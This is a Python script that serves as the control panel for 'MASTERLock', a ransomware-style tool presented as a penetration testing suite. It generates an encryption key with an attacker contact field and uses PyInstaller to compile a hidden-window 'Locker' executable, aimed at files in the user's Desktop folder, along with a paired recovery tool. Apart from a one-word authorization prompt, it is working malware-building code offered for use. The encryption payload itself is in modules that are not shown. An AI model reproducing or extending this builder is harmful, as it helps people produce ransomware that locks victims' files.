#!/usr/bin/env python3

import os
import sys
import time
import subprocess
from pathlib import Path

# UI Colors
RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
MAGENTA = "\033[95m"
BOLD = "\033[1m"
RESET = "\033[0m"

BANNER = f"""{RED}
███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗ 
████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
██╔████╔██║███████║███████╗   ██║   █████╗  ██████╔╝
██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔══╝  ██╔══██╗
██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║
╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
                                                    
██╗      ██████╗  ██████╗██╗  ██╗
██║     ██╔═══██╗██╔════╝██║ ██╔╝
██║     ██║   ██║██║     █████╔╝ 
██║     ██║   ██║██║     ██╔═██╗ 
███████╗╚██████╔╝╚██████╗██║  ██╗
╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝{RESET}
{CYAN}═══════════════════════════════════════════════════════════{RESET}
{YELLOW}    Penetration Testing & Security Suite{RESET}
{MAGENTA}        Developed by b1l4l-sec | Version 2.4{RESET}
{CYAN}═══════════════════════════════════════════════════════════{RESET}
"""

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_menu():
    print(f"""
{BOLD}{CYAN}┌─────────────────────────────────────────────────────────┐
│                MASTERLOCK CONTROL PANEL                 │
└─────────────────────────────────────────────────────────┘{RESET}

  {GREEN}[1]{RESET} {BOLD}Deploy MASTER Lock{RESET}
      └─ Generate payload and encryption key

  {GREEN}[2]{RESET} {BOLD}Build Windows Executables{RESET}
      └─ Compile Locker and Recovery Tool to .exe

  {GREEN}[3]{RESET} {BOLD}Test Decryption Tool{RESET}
      └─ Verify your secret.key functionality

  {GREEN}[4]{RESET} {BOLD}View Documentation{RESET}
      └─ Full Build & Recovery Instructions

  {RED}[0]{RESET} {BOLD}Back to Main Menu{RESET}

{CYAN}═══════════════════════════════════════════════════════════{RESET}
""")

def show_documentation():
    clear()
    print(BANNER)
    print(f"{BOLD}{MAGENTA}--- 1. WINDOWS PREPARATION & BUILD ---{RESET}")
    print(f"""
{BOLD}{YELLOW}STEP 1: INSTALL PYTHON (IF MISSING){RESET}
1. Open PowerShell or CMD as Administrator and run:
   {CYAN}winget install -e --id Python.Python.3.11{RESET}
2. Restart your terminal so 'python' is recognized.

{BOLD}{YELLOW}STEP 2: INSTALL DEPENDENCIES{RESET}
1. Navigate to the extracted folder:
   {CYAN}cd C:\\Path\\To\\MASTERLock{RESET}
2. Install required libraries:
   {CYAN}pip install cryptography pyinstaller{RESET}

{BOLD}{YELLOW}STEP 3: GENERATE EXECUTABLES{RESET}
1. Run this tool:
   {CYAN}python masterlock.py{RESET}
2. Select {GREEN}Option [2]{RESET} in the menu.
3. Your binaries will be ready in the {BOLD}\\dist\\{RESET} folder.
""")
    
    print(f"{BOLD}{MAGENTA}--- 2. RECOVERY SCENARIOS ---{RESET}")
    print(f"""
{BOLD}SCENARIO A: Locker GUI is visible{RESET}
1. Click "Unlock Files" -> Enter key from 'secret.key'.

{BOLD}SCENARIO B: GUI is closed / Process Crashed{RESET}
1. Open CMD in the 'dist' folder.
2. Run: {CYAN}RecoveryTool.exe{RESET}
3. Paste the key to restore files.
""")
    input(f"{BOLD}Press Enter to return to menu...{RESET}")

def build_executable():
    clear()
    print(BANNER)
    print(f"\n{BOLD}{CYAN}BUILD WINDOWS EXECUTABLES (.EXE){RESET}")

    # --- OS VALIDATION ---
    if os.name != 'nt':
        print(f"{RED}{BOLD}[!] OS ERROR: BUILD SYSTEM MISMATCH{RESET}")
        print(f"\n{YELLOW}You are currently running on {sys.platform.upper()}.{RESET}")
        print(f"PyInstaller can only create Windows (.exe) files when running {BOLD}ON{RESET} Windows.")
        print("-" * 50)
        print(f"{CYAN}To generate these files, please:{RESET}")
        print(f"1. Move this entire folder to a Windows VM or Machine.")
        print(f"2. Refer to {BOLD}Option [4] Documentation{RESET} for setup commands.")
        print("-" * 50)
        input(f"\n{BOLD}Press Enter to return to main menu...{RESET}")
        return

    base_dir = os.path.dirname(os.path.abspath(__file__))
    modules_folder = os.path.join(base_dir, "modules")
    payload_file = os.path.join(modules_folder, "payload.py")
    decryptor_file = os.path.join(modules_folder, "decryptor.py")
    
    if not os.path.exists(payload_file) or not os.path.exists(decryptor_file):
        print(f"{RED}Error: Cannot find source files in /modules/{RESET}")
        return

    # Data separator for Windows is ';'
    data_sep = ";"

    builds = [
        {
            "name": "MASTERLock (Locker)",
            "cmd": ["pyinstaller", "--noconsole", "--onefile", "--clean", "--distpath", "./dist", "--name", "MASTERLock", "--add-data", f"{modules_folder}{data_sep}modules", payload_file]
        },
        {
            "name": "RecoveryTool (Standalone)",
            "cmd": ["pyinstaller", "--console", "--onefile", "--clean", "--distpath", "./dist", "--name", "RecoveryTool", decryptor_file]
        }
    ]

    for b in builds:
        print(f"{YELLOW}[*] Building {b['name']}...{RESET}")
        try:
            subprocess.run(b['cmd'], check=True)
            print(f"{GREEN}✓ {b['name']} Success!{RESET}\n")
        except:
            print(f"{RED}✗ {b['name']} Failed!{RESET}\n")

    input(f"\n{BOLD}Press Enter to continue...{RESET}")

# Rest of the functions (deploy_masterlock, test_decryption, main) remain the same...

def show_legal_warning():
    clear()
    print(BANNER)
    print(f"{RED}{BOLD}!!! AUTHORIZATION REQUIRED !!!{RESET}")
    print(f"{YELLOW}This tool targets real files in the user's Desktop folder.{RESET}")
    response = input(f"\n{BOLD}{RED}Do you have written authorization to test this machine? (yes/no): {RESET}").strip().lower()
    return response == 'yes'

def deploy_masterlock():
    if not show_legal_warning():
        print(f"\n{YELLOW}Aborting...{RESET}")
        time.sleep(2)
        return

    clear()
    print(BANNER)
    print(f"\n{BOLD}{CYAN}DEPLOY MASTER LOCK CONFIGURATION{RESET}")

    try:
        from modules.crypto_engine import generate_payload
        contact_info = input(f"{CYAN}Enter contact (e.g., your email/handle): {RESET}").strip()
        if not contact_info: contact_info = "MASTER@CTF.LOCAL"

        print(f"\n{YELLOW}[*] Generating Encryption Keys...{RESET}")
        key_path = generate_payload(contact_info)
        print(f"{GREEN}✓ Key successfully generated at: {key_path}{RESET}")
    except Exception as e:
        print(f"{RED}Error: {e}{RESET}")

    input(f"\n{BOLD}Press Enter to return to menu...{RESET}")

def test_decryption():
    clear()
    print(BANNER)
    key_file = os.path.join(os.path.dirname(__file__), "modules", "secret.key")
    if os.path.exists(key_file):
        print(f"{GREEN}✓ Local {key_file} detected.{RESET}")
        with open(key_file, "rb") as f:
            print(f"{CYAN}Key: {f.read().decode()}{RESET}")
    else:
        print(f"{RED}No secret.key found in modules/.{RESET}")
    input(f"\n{BOLD}Press Enter to continue...{RESET}")

def main():
    while True:
        clear()
        print(BANNER)
        print_menu()
        choice = input(f"{BOLD}{CYAN}MASTERLock{RESET} > ").strip()
        if choice == '1': deploy_masterlock()
        elif choice == '2': build_executable()
        elif choice == '3': test_decryption()
        elif choice == '4': show_documentation()
        elif choice == '0': break
        else:
            print(f"{RED}Invalid Choice.{RESET}")
            time.sleep(1)

if __name__ == '__main__':
    main()